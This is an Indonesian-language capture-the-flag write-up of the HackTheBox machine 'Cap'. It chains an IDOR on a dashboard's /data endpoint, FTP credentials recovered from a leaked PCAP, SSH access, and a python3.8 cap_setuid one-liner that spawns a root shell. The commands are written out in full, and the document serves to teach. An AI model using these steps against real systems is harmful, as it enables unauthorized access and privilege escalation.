# Cap — IDOR + Linux Capabilities

**Date:** 2026-04-20
**Platform:** HackTheBox
**Difficulty:** Easy
**Category:** Web / Network / OS

---

## Target

Machine Linux (Ubuntu 20.04.2 LTS) yang menjalankan web app **Security Dashboard** berbasis Python (Gunicorn). Dashboard ini menampilkan monitoring jaringan termasuk fitur packet capture. Username yang terekspos dari dashboard: `nathan`.

## Vulnerability

Dua vulnerability utama dirantai untuk compromise penuh:

1. **IDOR (Insecure Direct Object Reference)** — endpoint `/data/{id}` tidak memvalidasi kepemilikan data. Siapapun bisa akses capture milik user lain hanya dengan mengganti angka di URL.

2. **Linux Capability Misconfiguration** — binary `python3.8` memiliki capability `cap_setuid` yang memungkinkan perubahan UID menjadi root tanpa sudo.

## Tools Used

- nmap
- Wireshark
- ffuf
- ssh
- python3.8 (native di target)

---

## Exploitation Steps

### Step 1 — Reconnaissance

Cek apakah host hidup, lalu enumerate port dan service yang berjalan.

```bash
ping -c 4 [TARGET_IP]
nmap -sV -sC -T4 [TARGET_IP]
```

Hasil scan:

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Gunicorn (Security Dashboard)
```

**Analisis:** Port 80 jadi prioritas — HTTP tidak butuh credentials dan punya attack surface paling luas. FTP dan SSH dicatat untuk nanti setelah dapat credentials.

---

### Step 2 — Web Enumeration & IDOR Discovery

Buka web app di browser. Ditemukan dashboard dengan beberapa menu:
- **Security Snapshot** — fitur packet capture dengan tombol Download
- **IP Config** — output ifconfig server
- **Network Status** — output netstat server

Perhatikan URL saat membuka Security Snapshot:

```
http://[TARGET_IP]/data/1
```

Ada angka `1` di akhir URL. Coba ganti ke `0`:

```
http://[TARGET_IP]/data/0
```

Jumlah packet jauh lebih banyak — ini data capture milik user lain yang seharusnya tidak bisa diakses. **IDOR confirmed.**

Download file PCAP dari `/data/0`.

Alternatif — enumerate dengan ffuf:

```bash
seq 0 20 > /tmp/numbers.txt
ffuf -u http://[TARGET_IP]/data/FUZZ -w /tmp/numbers.txt -mc 200
```

---

### Step 3 — PCAP Analysis dengan Wireshark

Buka file hasil download:

```bash
wireshark 0.pcap
```

Filter traffic FTP di Wireshark:

```
ftp
```

FTP tidak terenkripsi (plaintext), sehingga credentials terlihat jelas di packet berlabel `USER` dan `PASS`.

Credentials ditemukan:

```
Username : nathan
Password : [REDACTED - lihat di catatan pribadi]
```

---

### Step 4 — Foothold via SSH

SSH dipilih karena memberikan full shell access, berbeda dengan FTP yang hanya bisa upload/download file.

```bash
ssh nathan@[TARGET_IP]
```

Setelah berhasil login, ambil user flag:

```bash
ls
cat user.txt
```

**User flag location:** `/home/nathan/user.txt`

---

### Step 5 — Privilege Escalation via Linux Capabilities

Enumerate capabilities yang dimiliki binary di seluruh sistem:

```bash
getcap -r / 2>/dev/null
```

Output relevan:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`python3.8` memiliki `cap_setuid` — bisa mengubah UID menjadi siapapun termasuk root (UID 0).

Exploit:

```bash
python3.8 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Breakdown kode:
- `import os` — load library interaksi OS
- `os.setuid(0)` — ubah UID jadi 0 (root)
- `os.system('/bin/bash')` — spawn bash shell sebagai root

Prompt berubah menjadi `root@cap`. Ambil root flag:

```bash
cd /root
cat root.txt
```

**Root flag location:** `/root/root.txt`

---

## Proof

```
User Flag : /home/nathan/user.txt  ✅
Root Flag : /root/root.txt         ✅
```

---

## Lessons Learned

**Yang dipelajari:**
- IDOR terjadi karena server hanya validasi apakah request valid, tapi tidak validasi kepemilikan data. Dari sisi server, request `/data/0` kelihatan normal sehingga susah dideteksi sistem alert.
- FTP berbahaya di production karena plaintext — credentials langsung terbaca di PCAP tanpa perlu decrypt apapun.
- Linux Capabilities lebih granular dari SUID. SUID memberikan semua kekuatan root, sedangkan capabilities hanya memberikan kekuatan spesifik. Keduanya tetap berbahaya jika misconfigured.
- Setelah spawn shell via `os.system()`, posisi directory mengikuti user sebelumnya — perlu `cd /root` manual untuk navigasi ke home root.

**Kesalahan yang dibuat:**
- Sempat bingung antara FTP vs SSH untuk foothold — SSH langsung lebih optimal karena full shell access.
- Typo `os.systerm` instead of `os.system` — selalu double-check syntax sebelum eksekusi.

**Yang mau dieksplorasi lebih lanjut:**
- Vektor privesc lain: sudo misconfiguration, SUID binaries, cron jobs
- Fuzzing lebih dalam dengan ffuf untuk temukan endpoint tersembunyi
- Analisis PCAP lebih lanjut: filter HTTP, credentials di protokol lain

---

## Referensi Konvensi HTB

```
User flag → /home/[username]/user.txt
Root flag → /root/root.txt
```